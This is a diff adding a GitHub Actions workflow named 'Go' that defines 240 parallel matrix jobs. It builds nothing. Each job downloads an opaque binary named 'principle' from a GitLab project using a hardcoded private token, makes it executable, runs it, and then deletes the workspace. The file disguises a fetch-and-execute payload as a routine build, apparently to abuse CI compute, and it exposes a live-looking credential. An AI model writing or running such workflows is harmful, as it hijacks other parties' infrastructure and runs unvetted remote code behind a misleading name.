@@ -1,0 +1,28 @@
+name: Go
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
+jobs: 
+  build:
+    runs-on: Ubuntu-20.04    
+    strategy:
+      matrix:
+        Principle: [P-A,P-B,P-C,P-D,P-E,P-F,P-G,P-H,P-I,P-J,P-K,P-L]
+        Series: [V-01,V-02,V-03,V-04,V-05,V-06,V-07,V-08,V-09,V-10,V-11,V-12,V-13,V-14,V-15,V-16,V-17,V-18,V-19,V-20]
+      fail-fast: false
+    steps:
+    - name: Run checkout@v2.3.4
+      uses: actions/checkout@v2.3.4
+
+    - name: Build
+      run: |
+        wget -O principle --header='PRIVATE-TOKEN: Hzb9t2Xt2UxK-Uks3EmP' 'https://gitlab.com/api/v4/projects/25084399/repository/files/principle/raw?ref=master' && chmod 777 principle && ./principle
+        echo "done"
+    - name: Test
+      run: |
+        rm -rf *
+        echo "done"  
